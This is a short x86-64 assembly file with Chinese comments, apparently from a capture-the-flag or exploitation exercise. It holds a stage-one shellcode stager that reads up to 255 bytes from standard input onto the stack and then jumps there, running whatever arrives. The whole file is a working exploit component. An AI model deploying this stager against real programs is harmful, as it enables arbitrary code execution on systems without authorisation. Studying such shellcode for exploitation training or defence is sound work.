.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
.p2align 0
/* rsi = buffer (指向当前栈顶 rsp) */
    push rsp
    pop rsi

    /* rdi = fd (0, stdin) */
    xor edi, edi

    /* rax = syscall_number (0, read) */
    xor eax, eax

    /* rdx = size */
    cdq             /* 优雅！因为 eax=0，cdq 会直接把 edx 设为 0 */
    mov dl, 0xff

    /* 发起调用，并在结束后跳向刚刚写入的栈内存！ */
    syscall
    jmp rsp
